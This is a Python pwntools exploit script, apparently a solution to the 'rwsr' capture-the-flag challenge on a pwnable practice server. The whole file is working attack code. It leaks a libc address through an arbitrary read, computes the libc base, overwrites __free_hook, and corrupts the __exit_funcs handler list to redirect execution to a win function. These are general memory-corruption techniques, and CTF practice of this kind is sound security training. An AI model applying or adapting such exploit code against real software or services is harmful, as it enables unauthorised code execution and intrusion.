from pwn import *
#p = process("./rwsr")
p = remote("svc.pwnable.xyz", 30019)
elf = ELF("./rwsr")
libc = ELF("./libc-2.28.so")
pause()
p.sendlineafter("> ", "1")
p.sendlineafter("Addr: ", "6295496")

read_libc = u64(p.recv(6) + "\x00\x00")
libc_base= read_libc - libc.symbols['read']
__free_hook = libc_base  + libc.symbols['__free_hook']
p.info("libc base : " + hex(libc_base))
win = elf.symbols['win']

p.sendlineafter("> ", "2")
p.sendlineafter("Addr: ", str(__free_hook))
p.sendlineafter("Value: ", str(win))

__exit_funcs = libc_base + 0x3b7718

p.sendlineafter("> ", "1")
p.sendlineafter("Addr: ", str(__exit_funcs))

p.info("__exit_funcs : " + hex(__exit_funcs))

initial = u64(p.recv(6) + "\x00\x00")

p.info("initial : " + hex(initial))

p.sendlineafter("> ", "2")
p.sendlineafter("Addr: ", str(initial + 8))
p.sendlineafter("Value: ", str(0))

p.sendlineafter("> ", "2")
p.sendlineafter("Addr: ", str(initial))
p.sendlineafter("Value: ", str(win))

p.sendline("0")
p.interactive()
